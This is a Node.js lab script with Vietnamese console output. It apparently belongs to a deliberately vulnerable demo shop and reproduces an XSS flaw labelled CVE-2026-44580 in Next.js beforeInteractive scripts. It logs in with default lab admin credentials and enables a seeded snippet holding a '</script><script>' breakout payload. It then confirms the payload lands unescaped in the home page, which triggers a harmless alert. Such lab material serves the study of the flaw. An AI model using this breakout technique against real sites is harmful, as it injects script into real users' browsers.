#!/usr/bin/env node
/**
 * LAB ONLY - CVE-2026-44580 (XSS in beforeInteractive scripts).
 *
 * Enables the seeded marketing snippet "CVE-2026-44580 demo" and verifies that
 * the breakout payload lands unescaped in the serialized beforeInteractive
 * script on the storefront home page.
 *
 * Requires:
 *   - backend running with LOCAL_CVE_MODE=1
 *   - frontend built/run with build:study/start:study
 *   - `npm run seed:lab` in backend/ (creates the disabled snippet)
 *
 * Usage: node lab/44580-xss.mjs [--disable]
 */
const API = process.env.API_BASE_URL || 'http://127.0.0.1:4000';
const FE = process.env.FE_BASE_URL || 'http://127.0.0.1:3000';
const EMAIL = process.env.LAB_ADMIN_EMAIL || 'admin@minishop.demo';
const PASSWORD = process.env.LAB_ADMIN_PASSWORD || 'MiniShop-Admin-2026!';
const NAME = 'CVE-2026-44580 demo';
// Prefix that must appear verbatim in the serialized beforeInteractive script.
// (Next JSON-escapes the quotes in the payload, but not the `</script>`.)
const BREAKOUT = '</script><script>document.documentElement.dataset.cve44580=';
const disable = process.argv.includes('--disable');

async function json(url, init) {
  const res = await fetch(url, init);
  const body = await res.text();
  try { return { status: res.status, body: JSON.parse(body) }; }
  catch { return { status: res.status, body }; }
}

const login = await json(`${API}/api/auth/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: EMAIL, password: PASSWORD }),
});
if (login.status !== 200) {
  console.error('Không đăng nhập được admin. Kiểm tra backend, seed và LOCAL_CVE_MODE=1.');
  console.error(login.status, login.body);
  process.exit(1);
}
const token = login.body.token;

const list = await json(`${API}/api/marketing/snippets`, { headers: { Authorization: `Bearer ${token}` } });
const snippet = (list.body.snippets || []).find(s => s.name === NAME);
if (!snippet) {
  console.error(`Không thấy snippet "${NAME}". Chạy: cd backend && npm run build && npm run seed:lab`);
  process.exit(1);
}

const patch = await json(`${API}/api/marketing/snippets/${snippet.id}`, {
  method: 'PATCH',
  headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({ enabled: !disable }),
});
if (patch.status !== 200) {
  console.error('Không cập nhật được snippet:', patch.status, patch.body);
  process.exit(1);
}

if (disable) {
  console.log(`Đã tắt snippet "${NAME}".`);
  process.exit(0);
}

const page = await fetch(FE + '/');
const html = await page.text();
const present = html.includes(BREAKOUT);
console.log(`Trang chủ: HTTP ${page.status}, ${html.length} bytes`);
console.log(`Payload breakout nằm nguyên văn trong self.__next_s: ${present ? 'CÓ' : 'KHÔNG'}`);
if (!present) {
  console.error('Không tìm thấy payload. Kiểm tra snippet đang enabled và frontend đang chạy bản study.');
  process.exit(1);
}
const at = html.indexOf(BREAKOUT);
console.log('\nTrích đoạn HTML quanh payload:\n');
console.log(html.slice(Math.max(0, at - 120), at + BREAKOUT.length + 90));
console.log('\nMở ' + FE + '/ bằng browser: script sẽ chạy, alert CVE-2026-44580 xuất hiện.');
console.log('Tắt lại sau khi demo: node lab/44580-xss.mjs --disable');
